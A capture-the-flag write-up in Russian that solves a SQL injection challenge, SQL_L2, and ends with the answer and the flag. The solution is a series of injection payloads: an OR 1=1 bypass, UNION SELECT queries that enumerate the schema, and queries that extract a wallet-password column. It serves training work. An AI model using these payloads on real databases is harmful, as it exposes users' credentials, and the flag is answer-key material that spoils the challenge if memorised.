# WriteUp: SQL_L2

Ниже — авторский ход решения (из исходных материалов).

```
Решение L2
Задание: Необходимо узнать пароль от криптокошелька пользователя данного сайта.
Нам известно только имя: Keanu Reeves
ID криптокошелька: 654396669345
К сожалению иной информации у нас нет

Ход решения:

' OR 1=1;#
' unIon sElect table_name From information_schema.tables;#
' unIon sElect column_name From information_schema.columns where table_name='2023_ActualCustomerCryptoWalletInfo';#

Либо:
' unIon sElect customerName From 2023_ActualCustomerCryptoWalletInfo;# 
Считаем какой по счету Reeves (21) из всего списка пользователей

' unIon sElect CryptoWalletPassword From 2023_ActualCustomerCryptoWalletInfo;# 
Отсчитываем 21 паролей и берем 21й

Либо:
' unIon sElect CryptoWalletPassword From 2023_ActualCustomerCryptoWalletInfo where idOfCryptoWallet='654396669345';# 

Ответ: Wake_uP_,_NeO! (нужно взять из инструмента разработчика, так как сайт переводит все в UpperCase)
Флаг: CTFKHV{Wake_uP_,_NeO!}
```
